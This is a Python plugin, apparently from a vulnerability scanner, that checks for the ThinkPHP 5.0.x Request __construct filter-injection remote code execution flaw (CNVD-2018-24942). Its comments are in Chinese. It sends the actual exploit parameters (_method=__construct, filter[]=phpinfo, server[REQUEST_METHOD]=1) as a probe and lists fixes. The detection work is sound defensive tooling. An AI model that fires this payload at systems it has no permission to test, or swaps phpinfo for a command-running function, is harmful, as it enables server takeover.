# ThinkPHP 5.0.x Request 类 __construct filter 参数注入 RCE 变体
# 漏洞原因：5.0.x Request 类 __construct 方法接受外部输入覆盖 filter，
#           结合 server[REQUEST_METHOD]=1 触发 call_user_func 执行任意函数（phpinfo 变体）。
# 与 method_construct_rce.py 同源但利用链参数不同：本变体走 GET + s=captcha 路由，
# filter[] 直接传 phpinfo，无需 method/get[] 覆盖，影响 5.0.x 多版本。
# 本插件仅做存在性验证：以 phpinfo 作为探针，检测响应特征判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致）
REQUEST_RCE_V2_MARKER = 'thinkphp-request-rce-v2-confirmed'


class ThinkphpRequestRceV2Plugin(PluginBase):
    name = 'ThinkPHP 5.0.x Request 输入 RCE 变体'
    cve = 'CNVD-2018-24942'
    severity = 'high'
    category = 'vuln'
    description = '5.0.x Request 类 __construct 方法 filter 参数注入变体，' \
                  '经 server[REQUEST_METHOD] 触发 call_user_func 执行任意函数'
    fix = '升级 ThinkPHP 至官方修复版本；禁用 __construct 方法覆盖；对 filter 参数做白名单校验'

    def verify(self, target, session):
        url = join_url(target, '/')
        # 真实利用链参数（探针仅触发 phpinfo，不执行破坏性命令）
        params = {
            's': 'captcha',
            '_method': '__construct',
            'filter[]': 'phpinfo',
            'server[REQUEST_METHOD]': '1',
        }
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('ThinkPHP 5.0.x Request 输入 RCE 变体（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if REQUEST_RCE_V2_MARKER in text:
            print(ok('存在 ThinkPHP 5.0.x Request 输入 RCE 变体漏洞'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 Request 输入 RCE 变体特征：{REQUEST_RCE_V2_MARKER}',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP 5.0.x Request 输入 RCE 变体漏洞'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 RCE 变体特征（可能已修复或接口不可达）')
